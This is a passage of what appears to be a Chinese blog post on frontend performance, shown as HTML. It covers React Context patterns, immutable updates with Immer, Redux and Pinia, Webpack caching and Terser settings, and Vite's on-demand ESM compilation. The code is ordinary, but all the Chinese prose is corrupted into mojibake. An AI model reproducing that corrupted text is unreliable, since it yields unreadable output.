<span class="hljs-attr">value</span>=<span class="hljs-string">&#123;theme&#125;</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;user&#125;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">CartContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;cart&#125;</span>&gt;</span></span><br><span class="language-xml">      ...</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">CartContext.Provider</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ThemeContext.Provider</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>æœ€ä½³å®è·µåŸåˆ™</strong></p><p>(1) æœ€å°èŒƒå›´åŸåˆ™ï¼š</p><pre class="mermaid">graph LR  A[çŠ¶æ€åˆ›å»º] --> B{å½±å“èŒƒå›´}  B -->|ç»„ä»¶å†…| C[useState/ref]  B -->|çˆ¶å­ç»„ä»¶| D[Props/emit]  B -->|è·¨ç»„ä»¶| E[Context/Pinia]</pre><p>(2) è¯»å†™åˆ†ç¦»åŸåˆ™ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ†ç¦»çŠ¶æ€è¯»å–å’Œæ›´æ–°Context</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ThemeUpdateContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useTheme</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useThemeUpdate</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeUpdateContext</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) åŸå­åŒ–è®¾è®¡ï¼š</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// ä½¿ç”¨çŠ¶æ€ç®¡ç†åº“ï¼ˆå¦‚Jotaiï¼‰</span><br><span class="hljs-keyword">const</span> themeAtom = <span class="hljs-title function_">atom</span>(<span class="hljs-string">&#x27;light&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemeSwitcher</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title function_">useAtom</span>(themeAtom);<br>  <span class="hljs-comment">// ä»…è®¢é˜…themeçš„ç»„ä»¶æ›´æ–°</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ¡†æ¶æ¨èæ–¹æ¡ˆ</strong></p><table><thead><tr><th align="left">æ¡†æ¶</th><th align="left">å±€éƒ¨çŠ¶æ€</th><th align="left">ç»„ä»¶é—´å…±äº«</th><th align="left">å…¨å±€çŠ¶æ€</th></tr></thead><tbody><tr><td align="left">React</td><td align="left">useState</td><td align="left">Props + çŠ¶æ€æå‡</td><td align="left">Context&#x2F;Recoil&#x2F;Jotai</td></tr><tr><td align="left">Vue</td><td align="left">ref&#x2F;reactive</td><td align="left">Props&#x2F;emit</td><td align="left">Pinia&#x2F;Provide-Inject</td></tr><tr><td align="left">Angular</td><td align="left">Component State</td><td align="left">@Input&#x2F;@Output</td><td align="left">NgRx&#x2F;Service + RxJS</td></tr></tbody></table><blockquote><p>é»„é‡‘æ³•åˆ™ï¼šå½“çŠ¶æ€æ›´æ–°å¯¼è‡´è¶…è¿‡3ä¸ªæ— å…³ç»„ä»¶é‡æ¸²æŸ“æ—¶ï¼Œåº”é‡æ–°è¯„ä¼°çŠ¶æ€ä½ç½®</p></blockquote><h3 id="Immutable-Data-å‡å°‘é‡å¤æ¸²æŸ“"><a href="#Immutable-Data-å‡å°‘é‡å¤æ¸²æŸ“" class="headerlink" title="Immutable Data å‡å°‘é‡å¤æ¸²æŸ“"></a>Immutable Data å‡å°‘é‡å¤æ¸²æŸ“</h3><p><strong>æ ¸å¿ƒé—®é¢˜ï¼šå¯å˜æ•°æ®å¯¼è‡´çš„æ— æ•ˆæ¸²æŸ“</strong></p><pre class="mermaid">graph LR  A[çŠ¶æ€æ›´æ–°] --> B{ä½¿ç”¨å¯å˜æ•°æ®}  B -->|ç›´æ¥ä¿®æ”¹å¯¹è±¡/æ•°ç»„| C[å¼•ç”¨åœ°å€ä¸å˜]  C --> D[æµ…æ¯”è¾ƒæ— æ³•æ£€æµ‹å˜åŒ–]  D --> E[ç»„ä»¶ä¸æ›´æ–°æˆ–è¿‡åº¦æ›´æ–°]</pre><p><strong>Immutable Data è§£å†³æ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å¯å˜æ•°æ®ï¼ˆé—®é¢˜ï¼‰</span><br><span class="hljs-keyword">const</span> user = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> &#125;;<br>user.<span class="hljs-property">age</span> = <span class="hljs-number">31</span>; <span class="hljs-comment">// ä¿®æ”¹åå¼•ç”¨åœ°å€ä¸å˜</span><br><br><span class="hljs-comment">// ä¸å¯å˜æ•°æ®ï¼ˆè§£å†³æ–¹æ¡ˆï¼‰</span><br><span class="hljs-keyword">const</span> updatedUser = &#123; ...user, <span class="hljs-attr">age</span>: <span class="hljs-number">31</span> &#125;; <span class="hljs-comment">// åˆ›å»ºæ–°å¼•ç”¨</span><br></code></pre></td></tr></table></figure><p><strong>ä¸‰å¤§æ ¸å¿ƒä¼˜åŠ¿</strong></p><ul><li>ç²¾å‡†å˜æ›´æ£€æµ‹ï¼šå¼•ç”¨å˜åŒ–å³è¡¨ç¤ºæ•°æ®å˜åŒ–</li><li>æ¸²æŸ“ä¼˜åŒ–ï¼šé¿å…æ·±åº¦æ¯”è¾ƒçš„æ€§èƒ½æŸè€—</li><li>çŠ¶æ€å¯é¢„æµ‹ï¼šæ¶ˆé™¤éšå¼å‰¯ä½œç”¨</li></ul><p><strong>React å®ç°æ–¹æ¡ˆ</strong></p><p>(1) åŸºç¡€ä¸å¯å˜æ“ä½œ</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// å¯¹è±¡æ›´æ–°</span><br><span class="hljs-keyword">const</span> newState = &#123; ...oldState, <span class="hljs-attr">profile</span>: updatedProfile &#125;;<br><br><span class="hljs-comment">// æ•°ç»„æ›´æ–°</span><br><span class="hljs-keyword">const</span> newList = [<br>  ...oldList.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, index),<br>  updatedItem,<br>  ...oldList.<span class="hljs-title function_">slice</span>(index + <span class="hljs-number">1</span>)<br>];<br><br><span class="hljs-comment">// åµŒå¥—ç»“æ„æ›´æ–°</span><br><span class="hljs-keyword">const</span> newData = &#123;<br>  ...oldData,<br>  <span class="hljs-attr">user</span>: &#123;<br>    ...oldData.<span class="hljs-property">user</span>,<br>    <span class="hljs-attr">address</span>: &#123;<br>      ...oldData.<span class="hljs-property">user</span>.<span class="hljs-property">address</span>,<br>      <span class="hljs-attr">city</span>: <span class="hljs-string">&#x27;New York&#x27;</span><br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) ä½¿ç”¨ Immer ç®€åŒ–</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> produce <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;immer&#x27;</span>;<br><br><span class="hljs-keyword">const</span> nextState = <span class="hljs-title function_">produce</span>(currentState, <span class="hljs-function"><span class="hljs-params">draft</span> =&gt;</span> &#123;<br>  draft.<span class="hljs-property">user</span>.<span class="hljs-property">age</span> = <span class="hljs-number">31</span>;<br>  draft.<span class="hljs-property">posts</span>.<span class="hljs-title function_">push</span>(&#123; <span class="hljs-attr">id</span>: <span class="hljs-number">100</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;New Post&#x27;</span> &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>(3) Redux æœ€ä½³å®è·µ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">todoReducer</span>(<span class="hljs-params">state = initialState, action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;TOGGLE_TODO&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<br>        ...state,<br>        <span class="hljs-attr">todos</span>: state.<span class="hljs-property">todos</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span><br>          todo.<span class="hljs-property">id</span> === action.<span class="hljs-property">id</span> ? &#123; ...todo, <span class="hljs-attr">completed</span>: !todo.<span class="hljs-property">completed</span> &#125; : todo<br>        )<br>      &#125;;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Vue å®ç°æ–¹æ¡ˆ</strong></p><p>(1) ç»„åˆå¼ API ä¼˜åŒ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;script setup&gt;<br>import &#123; reactive &#125; from &#x27;vue&#x27;;<br><br>// ä½¿ç”¨ä¸å¯å˜æ›´æ–°<br>const state = reactive(&#123; items: [] &#125;);<br><br>function addItem(newItem) &#123;<br>  state.items = [...state.items, newItem]; // åˆ›å»ºæ–°æ•°ç»„<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>(2) Pinia ä¸å¯å˜æ¨¡å¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// store</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCart = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">&#x27;cart&#x27;</span>, &#123;<br>  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> (&#123; <span class="hljs-attr">items</span>: [] &#125;),<br>  <span class="hljs-attr">actions</span>: &#123;<br>    <span class="hljs-title function_">addItem</span>(<span class="hljs-params">product</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span> = [...<span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>, product]; <span class="hljs-comment">// ä¸å¯å˜æ›´æ–°</span><br>    &#125;<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–åŸç†</strong></p><pre class="mermaid">graph TD  A[çŠ¶æ€å˜æ›´] --> B{æ˜¯å¦ä½¿ç”¨ä¸å¯å˜æ•°æ®}  B -->|æ˜¯| C[åˆ›å»ºæ–°å¼•ç”¨]  C --> D[æµ…æ¯”è¾ƒå³å¯æ£€æµ‹å˜åŒ–]  D --> E[ç²¾å‡†æ›´æ–°ç›¸å…³ç»„ä»¶]    B -->|å¦| F[ä¿®æ”¹åŸå¯¹è±¡]  F --> G[å¼•ç”¨æœªå˜ä½†å†…å®¹å˜åŒ–]  G --> H[éœ€è¦æ·±åº¦æ¯”è¾ƒæ£€æµ‹å˜åŒ–]  H --> I[æ€§èƒ½æŸè€—+å¯èƒ½æ¼æ›´æ–°]</pre><p><strong>ä¸å¯å˜æ•°æ®å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">å¯å˜æ•°æ® (Mutable)</th><th align="left">ä¸å¯å˜æ•°æ® (Immutable)</th></tr></thead><tbody><tr><td align="left">æ£€æµ‹æ–¹å¼</td><td align="left">æ·±åº¦æ¯”è¾ƒ</td><td align="left">æµ…æ¯”è¾ƒ</td></tr><tr><td align="left">æ›´æ–°æ€§èƒ½</td><td align="left">å¿«(ä¿®æ”¹)æ…¢(æ¯”è¾ƒ)</td><td align="left">æ…¢(åˆ›å»º)å¿«(æ¯”è¾ƒ)</td></tr><tr><td align="left">å†…å­˜ä½¿ç”¨</td><td align="left">ä½</td><td align="left">é«˜(éœ€åƒåœ¾å›æ”¶)</td></tr><tr><td align="left">ä»£ç å¤æ‚åº¦</td><td align="left">ç®€å•(ç›´æ¥ä¿®æ”¹)</td><td align="left">å¤æ‚(éœ€åˆ›å»ºå‰¯æœ¬)</td></tr><tr><td align="left">è°ƒè¯•éš¾åº¦</td><td align="left">éš¾(çŠ¶æ€å†å²ä¸¢å¤±)</td><td align="left">æ˜“(å®Œæ•´çŠ¶æ€å¿«ç…§)</td></tr><tr><td align="left">å¹¶å‘å®‰å…¨</td><td align="left">ä¸å®‰å…¨</td><td align="left">å®‰å…¨</td></tr></tbody></table><h1 id="äº”ã€å·¥ç¨‹åŒ–åŸºå»ºä¼˜åŒ–"><a href="#äº”ã€å·¥ç¨‹åŒ–åŸºå»ºä¼˜åŒ–" class="headerlink" title="äº”ã€å·¥ç¨‹åŒ–åŸºå»ºä¼˜åŒ–"></a>äº”ã€å·¥ç¨‹åŒ–åŸºå»ºä¼˜åŒ–</h1><h2 id="5-1-æ„å»ºå·¥å…·ä¼˜åŒ–"><a href="#5-1-æ„å»ºå·¥å…·ä¼˜åŒ–" class="headerlink" title="5.1 æ„å»ºå·¥å…·ä¼˜åŒ–"></a>5.1 æ„å»ºå·¥å…·ä¼˜åŒ–</h2><h3 id="Webpackï¼šæŒä¹…åŒ–ç¼“å­˜ã€å¹¶è¡Œå‹ç¼©ï¼ˆTerserå¤šè¿›ç¨‹ï¼‰"><a href="#Webpackï¼šæŒä¹…åŒ–ç¼“å­˜ã€å¹¶è¡Œå‹ç¼©ï¼ˆTerserå¤šè¿›ç¨‹ï¼‰" class="headerlink" title="Webpackï¼šæŒä¹…åŒ–ç¼“å­˜ã€å¹¶è¡Œå‹ç¼©ï¼ˆTerserå¤šè¿›ç¨‹ï¼‰"></a>Webpackï¼šæŒä¹…åŒ–ç¼“å­˜ã€å¹¶è¡Œå‹ç¼©ï¼ˆTerserå¤šè¿›ç¨‹ï¼‰</h3><p><strong>æŒä¹…åŒ–ç¼“å­˜ (Persistent Caching)</strong></p><p>è§£å†³çš„é—®é¢˜ï¼š</p><ul><li>Webpack æ¯æ¬¡æ„å»ºé»˜è®¤ä¼šé‡æ–°å¤„ç†æ‰€æœ‰æ¨¡å—ï¼ˆè§£æã€åŠ è½½ã€è½¬æ¢ï¼‰ï¼Œå¯¼è‡´é‡å¤æ„å»ºå¼€é”€ï¼Œå°¤å…¶å½±å“å¤§å‹é¡¹ç›®çš„å¼€å‘è¿­ä»£å’Œ CI&#x2F;CD æ•ˆç‡ã€‚</li></ul><p>æ ¸å¿ƒæœºåˆ¶ï¼ˆWebpack 5+ï¼‰ï¼š</p><p>(1) ç¼“å­˜å­˜å‚¨ï¼š</p><ul><li>å°†æ¨¡å—æ„å»ºç»“æœï¼ˆASTã€è½¬æ¢åä»£ç ã€ä¾èµ–å…³ç³»ç­‰ï¼‰åºåˆ—åŒ–å­˜å‚¨åˆ°æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼ˆé»˜è®¤è·¯å¾„ï¼šnode_modules&#x2F;.cache&#x2F;webpackï¼‰</li><li>é…ç½®ç¤ºä¾‹ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">cache</span>: &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;filesystem&#x27;</span>,  <span class="hljs-comment">// å¯ç”¨æ–‡ä»¶ç³»ç»Ÿç¼“å­˜</span><br>    <span class="hljs-attr">cacheDirectory</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;.temp_cache&#x27;</span>), <span class="hljs-comment">// è‡ªå®šä¹‰ç¼“å­˜ç›®å½•</span><br>    <span class="hljs-attr">buildDependencies</span>: &#123;<br>      <span class="hljs-attr">config</span>: [__filename],  <span class="hljs-comment">// é…ç½®æ–‡ä»¶å˜æ›´æ—¶ä½¿ç¼“å­˜å¤±æ•ˆ</span><br>    &#125;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) å¢é‡æ„å»ºï¼š</p><ul><li>äºŒæ¬¡æ„å»ºæ—¶ä»…å¤„ç†å˜æ›´æ–‡ä»¶åŠå…¶ä¾èµ–é“¾</li><li>æœªå˜æ›´æ¨¡å—ç›´æ¥ä»ç¼“å­˜è¯»å–ï¼Œè·³è¿‡è§£æ&#x2F;è½¬æ¢æµç¨‹</li></ul><p>(3) æ™ºèƒ½å¤±æ•ˆï¼š</p><ul><li>è‡ªåŠ¨è¿½è¸ªé…ç½®ã€loaderã€ä¾èµ–åŒ…ç‰ˆæœ¬ç­‰å…³é”®å› ç´ </li><li>ç›¸å…³å˜æ›´æ—¶è‡ªåŠ¨å¤±æ•ˆå¯¹åº”ç¼“å­˜</li></ul><p><strong>å¹¶è¡Œå‹ç¼© (Parallel Compression with Terser)</strong></p><p>è§£å†³çš„é—®é¢˜ï¼š</p><ul><li>JavaScript å‹ç¼©ï¼ˆæ··æ·†&#x2F;ä¼˜åŒ–ï¼‰æ˜¯æ„å»ºä¸­æœ€è€— CPU çš„é˜¶æ®µ</li><li>é»˜è®¤å•çº¿ç¨‹å‹ç¼©æ— æ³•åˆ©ç”¨å¤šæ ¸ CPU ä¼˜åŠ¿</li></ul><p>å®ç°åŸç†ï¼š</p><ul><li>å¤šè¿›ç¨‹å¹¶è¡Œï¼š<ul><li>é€šè¿‡ TerserPlugin çš„ parallel é€‰é¡¹å¯ç”¨</li><li>åˆ›å»ºå¤šä¸ª Worker è¿›ç¨‹ï¼ˆé»˜è®¤æ•°é‡ï¼šCPU æ ¸å¿ƒæ•° -1ï¼‰</li><li>å°†ä¸åŒ chunk åˆ†é…ç»™ Worker å¹¶è¡Œå‹ç¼©</li></ul></li><li>ç”Ÿäº§ç¯å¢ƒé…ç½®ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">TerserPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;terser-webpack-plugin&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-attr">minimizer</span>: [<br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">TerserPlugin</span>(&#123;<br>        <span class="hljs-attr">parallel</span>: <span class="hljs-literal">true</span>,  <span class="hljs-comment">// å¯ç”¨å¤šè¿›ç¨‹å‹ç¼©</span><br>        <span class="hljs-attr">terserOptions</span>: &#123;<br>          <span class="hljs-attr">compress</span>: &#123; <span class="hljs-attr">drop_console</span>: <span class="hljs-literal">true</span> &#125;  <span class="hljs-comment">// å‹ç¼©é…ç½®</span><br>        &#125;<br>      &#125;)<br>    ]<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="Viteï¼šåŸºäºESMçš„æŒ‰éœ€ç¼–è¯‘"><a href="#Viteï¼šåŸºäºESMçš„æŒ‰éœ€ç¼–è¯‘" class="headerlink" title="Viteï¼šåŸºäºESMçš„æŒ‰éœ€ç¼–è¯‘"></a>Viteï¼šåŸºäºESMçš„æŒ‰éœ€ç¼–è¯‘</h3><p><strong>æ ¸å¿ƒåŸç†ï¼šESM åŸç”Ÿæ”¯æŒ</strong></p><p>(1) ä¼ ç»Ÿæ‰“åŒ…å™¨é—®é¢˜ï¼ˆå¦‚ Webpackï¼‰ï¼š</p><ul><li>å¯åŠ¨æ…¢ï¼šéœ€å…ˆæ‰“åŒ…æ•´ä¸ªåº”ç”¨æ‰èƒ½å¯åŠ¨æœåŠ¡</li><li>çƒ­æ›´æ–°æ…¢ï¼šæ–‡ä»¶ä¿®æ”¹åéœ€é‡æ–°æ„å»ºæ•´ä¸ª bundle</li><li>æŒ‰éœ€åŠ è½½å±€é™ï¼šä»…æ”¯æŒè·¯ç”±çº§ä»£ç åˆ†å‰²</li></ul><p>(2) Vite çš„çªç ´ï¼š</p><ul><li>åˆ©ç”¨æµè§ˆå™¨åŸç”Ÿæ”¯æŒ ES æ¨¡å— (ESM)ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- æµè§ˆå™¨ç›´æ¥è§£æ ESM --&gt;<br>&lt;script type=&quot;module&quot; src=&quot;/src/main.js&quot;&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><ul><li>æŒ‰éœ€ç¼–è¯‘ï¼š<ul><li>å¯åŠ¨æ—¶åªç¼–è¯‘è½»é‡çº§ä¾èµ–ï¼ˆé¢„æ„å»ºï¼‰</li><li>ä¸šåŠ¡ä»£ç æŒ‰éœ€è½¬æ¢ï¼ˆè®¿é—®æ—¶ç¼–è¯‘ï¼‰</li></ul></li></ul><p><strong>å·¥ä½œæµç¨‹</strong></p><pre class="mermaid">graph LR    A[æµè§ˆå™¨è¯·æ±‚] --> B[Vite æœåŠ¡å™¨]    B --> C{è·¯ç”±è¯·æ±‚?}    C -->|æ˜¯| D[è¿”å› HTML æ¨¡æ¿]    C -->|å¦| E{æ–‡ä»¶ç±»å‹}    E -->|JS/TS| F[æŒ‰éœ€ç¼–è¯‘ä¸º ESM]    E -->|CSS| G[ç¼–è¯‘ä¸º CSS å˜é‡æ³¨å…¥]    E -->|Vue/JSX| H[å³æ—¶ç¼–è¯‘ä¸º JS]    F & G & H --> I[è¿”å›æµè§ˆå™¨æ‰§è¡Œ]</pre><p><strong>å…³é”®æŠ€æœ¯å®ç°</strong></p><p>(1) ä¾èµ–é¢„æ„å»ºï¼š</p><ul><li>ç›®æ ‡ï¼šå°† CommonJS æ¨¡å—è½¬æ¢ä¸º ESMï¼Œåˆå¹¶é›¶æ•£æ–‡ä»¶</li><li>å·¥å…·ï¼šesbuildï¼ˆGo è¯­è¨€ç¼–å†™ï¼Œæ¯” JS å·¥å…·å¿« 10-100 å€ï¼‰</li><li>ç»“æœï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è½¬æ¢å‰ï¼ˆnode_modulesï¼‰</span><br><span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);<br><br><span class="hljs-comment">// è½¬æ¢åï¼ˆé¢„æ„å»ºï¼‰</span><br><span class="hljs-keyword">import</span> lodash <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/node_modules/.vite/lodash.js&#x27;</span>;<br></code></pre></td></tr></table></figure><p>(2) æŒ‰éœ€ç¼–è¯‘</p><ul><li>è¯·æ±‚æ‹¦æˆªï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Vite ä¸­é—´ä»¶ä¼ªä»£ç </span><br>server.<span class="hljs-property">middlewares</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">url</span>.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">&#x27;.vue&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">const</span> code = <span class="hljs-title function_">compileVue</span>(req.<span class="hljs-property">url</span>); <span class="hljs-comment">// å³æ—¶ç¼–è¯‘</span><br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-title function_">transformToESM</span>(code));<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><ul><li>ç¼–è¯‘æ—¶æœºï¼šæµè§ˆå™¨å‘èµ·è¯·æ±‚æ—¶æ‰ç¼–è¯‘å¯¹åº”æ–‡ä»¶</li></ul><p>(3) HMR çƒ­æ›´æ–°ï¼š</p><ul><li>ä¼ ç»Ÿæ–¹æ¡ˆï¼šé‡å»ºæ•´ä¸ª bundle</li><li>Vite æ–¹æ¡ˆï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å»ºç«‹ WebSocket è¿æ¥</span><br><span class="hljs-keyword">const</span> socket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&#x27;ws://localhost:3000&#x27;</span>);<br><br><span class="hljs-comment">// æ–‡ä»¶ä¿®æ”¹æ—¶</span><br>socket.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">&#123; data &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;update&#x27;</span>) &#123;<br>    <span class="hljs-comment">// åªé‡æ–°è¯·æ±‚å•ä¸ªæ¨¡å—</span><br>    <span class="hljs-keyword">import</span>(<span class="hljs-string">`/src/<span class="hljs-subst">$&#123;data.filePath&#125;</span>?t=<span class="hljs-subst">$&#123;<span class="hljs-built_in">Date</span>.now()&#125;</span>`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é€‚ç”¨åœºæ™¯</strong></p><ul><li>ä¼˜åŠ¿åœºæ™¯ï¼š<ul><li>ç°ä»£æµè§ˆå™¨é¡¹ç›®ï¼ˆéœ€æ”¯æŒ ESMï¼‰</li><li>å¤§å‹ Monorepo 